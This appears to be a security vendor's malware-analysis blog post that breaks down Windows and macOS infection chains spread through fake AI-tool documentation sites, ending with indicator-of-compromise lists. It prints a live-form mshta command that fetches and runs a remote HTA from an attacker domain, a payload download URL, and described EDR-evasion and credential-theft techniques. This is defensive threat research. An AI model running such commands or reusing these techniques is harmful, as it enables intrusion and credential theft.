# Inside the Attack: Complete Technical Breakdown of the AI Ecosystem Threat Campaign

- **Source :** threatbook
- **URL :** https://threatbook.io/blog/inside-the-attack-complete-technical-breakdown-of-the-ai-ecosystem-threat-campaign
- **Date :** 2026-03-20

---

3 min read 

# Inside the Attack: Complete Technical Breakdown of the AI Ecosystem Threat Campaign

[ ![Picture of ThreatBook Research Team](https://threatbook.io/hubfs/Brand%20Resources/favicon-192x192.png) ThreatBook Research Team ](https://threatbook.io/blog/author/threatbook-research-team) :  March 20, 2026 

[Threat Research](https://threatbook.io/blog/tag/threat-research)

**Table of Contents**

Windows Infection Chain

macOS Infection Chain

Indicators of Compromise

This is the full technical companion to our campaign overview published in [Part 1](/blog/phishing-with-google-ads-and-fake-ai-docs-a-criminal-campaign-targeting-the-ai-ecosystem). It documents the Windows and macOS malware chains in detail, and provides the complete indicator of compromise list for threat hunting and detection rule development.

## Windows Infection Chain

The Windows infection chain is initiated by a single terminal command:

` C:\Windows\SysWOW64\mshta.exe https://kimi.install-files.com/kimi`

This invokes mshta.exe — a legitimate Windows system binary for executing HTML Application (.hta) files with local system-level privileges. Because it is a trusted Windows component, it bypasses most application allowlisting controls. Here it is used to remotely load a malicious HTA file from attacker-controlled infrastructure.

![](https://threatbook.io/hs-fs/hubfs/undefined.png?width=1080&height=637&name=undefined.png)

**Obfuscation Layer**

The HTA file defines AutoOpen as its entry point — but the entry point is defined ten times. Under standard programming conventions, only the final definition is effective; however, each of the ten definitions references different variables, different hex decoding functions, and different Base64 decoding functions. All implement the same underlying deserialization-and-execute logic. The repetition is not redundancy — it is deliberate obfuscation designed to exhaust static analysis and defeat pattern-matching detection.

**.NET Deserialization Chain**

The final AutoOpen definition invokes a function that uses hex decoding to decrypt a string, creates a WScript.Shell object via CreateObject, and retrieves the process environment. It then constructs an inline XML manifest in memory, registers a .NET type, and uses CreateObject with an activation context to instantiate a BinaryFormatter — entirely in memory, without triggering a .NET installation interface.![](https://threatbook.io/hs-fs/hubfs/undefined-1.png?width=567&height=465&name=undefined-1.png)

Two payloads are deserialized from embedded Base64-encoded data. The first (approximately 2,225 bytes) disables ActivitySurrogateSelector type-checking — a .NET security control that restricts untrusted objects from participating in deserialization — via an embedded XAML directive. This is a necessary prerequisite for the second payload. The second payload (approximately 170,000 bytes) uses System.Windows.Forms.AxHost+State as an outer wrapper, loading a .NET module named Share (compiled February 25, 2026) into memory.

**Shellcode and Final Payload**

Share extracts and decrypts data from an embedded resource section, producing a second .NET module, Ethics. Ethics decrypts two architecture-specific shellcode payloads from its own resource section, selects the appropriate one, writes it to a memory region, marks it executable via VirtualProtect, and invokes it through .NET's delegate mechanism.

The shellcode is itself a loader. Its entry instruction jumps past 102,628 bytes of encrypted data to a decryption stub at the payload's end, which decrypts and executes the final stage.

_The final payload is a remote access trojan compiled February 25, 2026. Its import table has been deliberately stripped; it uses direct NT syscalls internally to bypass EDR products that rely on userland API hook interception. Upon execution it connects to C2 at 144.124.235.102:443._

_![](https://threatbook.io/hs-fs/hubfs/undefined-2.png?width=1080&height=487&name=undefined-2.png)_

## macOS Infection Chain

The macOS chain begins with a single Base64-encoded terminal command that decodes to a download URL:

![](https://threatbook.io/hs-fs/hubfs/undefined-3.png?width=1080&height=35&name=undefined-3.png)

` http://jaxfamilylawyers.com/curl/515b7a4ebc1a925a99df8abd6ae508ffa971c9d97d6d595fa3f3cd6ee410d78d`

The downloaded file is itself encoded; decoding produces a shell script. The shell script downloads and executes an AppleScript payload from the attacker's server. The payload identifies itself internally as MacSync Stealer v1.1.2 (release build).

![](https://threatbook.io/hs-fs/hubfs/undefined-4.png?width=980&height=621&name=undefined-4.png)

![](https://threatbook.io/hs-fs/hubfs/undefined-Mar-13-2026-05-51-08-8309-AM.png?width=1080&height=910&name=undefined-Mar-13-2026-05-51-08-8309-AM.png)

**Execution Sequence**

  * Terminal suppression — The script closes the active terminal window immediately upon execution, removing the user's ability to observe its activity.
  * Working directory creation — A temporary directory is created at /tmp/sync{randomNumber} for staging collected data.  
![](https://threatbook.io/hs-fs/hubfs/undefined-Mar-13-2026-05-52-47-9124-AM.png?width=604&height=218&name=undefined-Mar-13-2026-05-52-47-9124-AM.png)
  * Password harvesting — A dialog window visually indistinguishable from a legitimate macOS authentication prompt requests the user's login credentials. The entered password is verified against the local account database using the macOS dscl utility before being retained.  
![](https://threatbook.io/hs-fs/hubfs/undefined-Mar-13-2026-05-53-26-6899-AM.png?width=1080&height=400&name=undefined-Mar-13-2026-05-53-26-6899-AM.png)
  * Browser credential theft — Chromium-based browsers are targeted for cookies, saved credentials, and autofill data. Specific browser extensions are also targeted by hardcoded extension ID, covering password managers, 2FA apps, and cryptocurrency wallet extensions.  
![](https://threatbook.io/hs-fs/hubfs/undefined-Mar-13-2026-05-53-48-2876-AM.png?width=736&height=381&name=undefined-Mar-13-2026-05-53-48-2876-AM.png)
  * Broad data collection — Cryptocurrency wallet application data, messaging app data, notes, credential configuration files, password manager databases, sensitive documents, and system environment information are collected.
  * Crypto wallet persistence — If Ledger Live or Ledger Wallet is installed, malicious replacement files are downloaded and substituted for the application's app.asar and Info.plist files. The application is re-signed, converting it into a persistent attacker-controlled exfiltration tool.  

  * Exfiltration and cleanup — All collected data is archived to /tmp/osalogging.zip, uploaded to the attacker's server, then deleted locally. A fake error dialog is displayed: "Your Mac does not support this application. Try reinstalling or downloading the version for your system."  




## Indicators of Compromise

Hyperlinks to IOCs lead to [ThreatBook Investigator](https://i.threatbook.io/), where you can view details. Sample:

![](https://threatbook.io/hs-fs/hubfs/image-png.png?width=1255&height=821&name=image-png.png)

### Phishing Domains

  * [docs-claude-code-app.squarespace.com](https://i.threatbook.io/research/docs-claude-code-app.squarespace.com)

  * [claude-code-docs-app.craft.me](https://i.threatbook.io/research/claude-code-docs-app.craft.me)

  * [claulastver.squarespace.com](https://i.threatbook.io/research/claulastver.squarespace.com)

  * [openclaw-dwnl.squarespace.com](https://i.threatbook.io/research/openclaw-dwnl.squarespace.com)

  * [mac-storage-optimazer.craft.me](https://i.threatbook.io/research/mac-storage-optimazer.craft.me)

  * [macstorage-cleaner.craft.me](https://i.threatbook.io/research/macstorage-cleaner.craft.me)

  * [notebooklm-last-version.squarespace.com](https://i.threatbook.io/research/notebooklm-last-version.squarespace.com)




### 

### Windows Payload Delivery

  * [openclaw.install-files.com](https://i.threatbook.io/research/openclaw.install-files.com)

  * [google-notebooklm.install-files.com](https://i.threatbook.io/research/google-notebooklm.install-files.com)

  * [claude-code.install-files.com](https://i.threatbook.io/research/claude-code.install-files.com)

  * [kimi.install-files.com](https://i.threatbook.io/research/kimi.install-files.com)

  * [qwen.install-files.com](https://i.threatbook.io/research/qwen.install-files.com)

  * [claude-code.official-version.com](https://i.threatbook.io/research/claude-code.official-version.com)

  * [openclaw.official-version.com](https://i.threatbook.io/research/openclaw.official-version.com)

  * [claude.update-version.com](https://i.threatbook.io/research/claude.update-version.com)

  * [openclaw.update-version.com](https://i.threatbook.io/research/openclaw.update-version.com)

  * [doubao.update-version.com](https://i.threatbook.io/research/doubao.update-version.com)




### macOS Payload Delivery

  * [saramoftah.com](https://i.threatbook.io/research/saramoftah.com)

  * [res2erch-sl0ut.com](https://i.threatbook.io/research/res2erch-sl0ut.com)

  * [coco2-hram.com](https://i.threatbook.io/research/coco2-hram.com)

  * [kayeart.com](https://i.threatbook.io/research/kayeart.com)

  * [jaxfamilylawyers.com](https://i.threatbook.io/research/jaxfamilylawyers.com)




### C2 Infrastructure

  * 144.124.235.102:443

  * 45.94.47.204:80




Detection and protection for this campaign is in place across ThreatBook products. Organizations that identify any of the above IOCs in their environment should treat affected hosts as compromised and initiate incident response procedures immediately.

Contact ThreatBook to learn more about how we can help you in AI application threat detection.

  *   * Share
  * 


[ ![Lazarus Group Poisons Axios: Inside the npm Supply Chain Attack](https://threatbook.io/hubfs/Inside%20the%20npm%20Supply%20Chain%20Attack.png) ](https://threatbook.io/blog/lazarus-group-poisons-axios-inside-the-npm-supply-chain-attack)

1 min read 

#### [Lazarus Group Poisons Axios: Inside the npm Supply Chain Attack](https://threatbook.io/blog/lazarus-group-poisons-axios-inside-the-npm-supply-chain-attack)

[![Picture of ThreatBook Research Team](https://threatbook.io/hs-fs/hubfs/Brand%20Resources/favicon-192x192.png?width=30&name=favicon-192x192.png) ThreatBook Research Team](https://threatbook.io/blog/author/threatbook-research-team) : 1 April 2026, 12:04 AM

Regarding yesterday's Axios npm supply chain poisoning incident, ThreatBook has conducted in-depth sample analysis and attack tracing. Drawing on...

[Threat Research](https://threatbook.io/blog/tag/threat-research)

[Read More](https://threatbook.io/blog/lazarus-group-poisons-axios-inside-the-npm-supply-chain-attack)

[ ![How a Malicious Plugin Turned OpenClaw Into a Credential Stealer](https://threatbook.io/hubfs/How%20a%20Malicious%20Plugin%20Turned%20OpenClaw%20Into%20a%20Credential%20Stealer.jpeg) ](https://threatbook.io/blog/how-a-malicious-plugin-turned-openclaw-into-a-credential-stealer)

1 min read 

#### [How a Malicious Plugin Turned OpenClaw Into a Credential Stealer](https://threatbook.io/blog/how-a-malicious-plugin-turned-openclaw-into-a-credential-stealer)

[![Picture of ThreatBook Research Team](https://threatbook.io/hs-fs/hubfs/Brand%20Resources/favicon-192x192.png?width=30&name=favicon-192x192.png) ThreatBook Research Team](https://threatbook.io/blog/author/threatbook-research-team) : 18 March 2026, 08:03 AM

Last week, ThreatBook's endpoint detection product, OneSEC EDR, identified and fully captured an active attack targeting OpenClaw users. The attack...

[Threat Research](https://threatbook.io/blog/tag/threat-research)

[Read More](https://threatbook.io/blog/how-a-malicious-plugin-turned-openclaw-into-a-credential-stealer)

[ ![Singapore's Cyber Threat Landscape: Inside the 2025 Data](https://threatbook.io/hubfs/Blog%20Images/Singapore%20Cyber%20Threat%20Landscape%202025.png) ](https://threatbook.io/blog/singapores-cyber-threat-landscape-inside-the-2025-data)

1 min read 

#### [Singapore's Cyber Threat Landscape: Inside the 2025 Data](https://threatbook.io/blog/singapores-cyber-threat-landscape-inside-the-2025-data)

[![Picture of ThreatBook Research Team](https://threatbook.io/hs-fs/hubfs/Brand%20Resources/favicon-192x192.png?width=30&name=favicon-192x192.png) ThreatBook Research Team](https://threatbook.io/blog/author/threatbook-research-team) : 16 March 2026, 12:03 AM

[Threat Research](https://threatbook.io/blog/tag/threat-research)

[Read More](https://threatbook.io/blog/singapores-cyber-threat-landscape-inside-the-2025-data)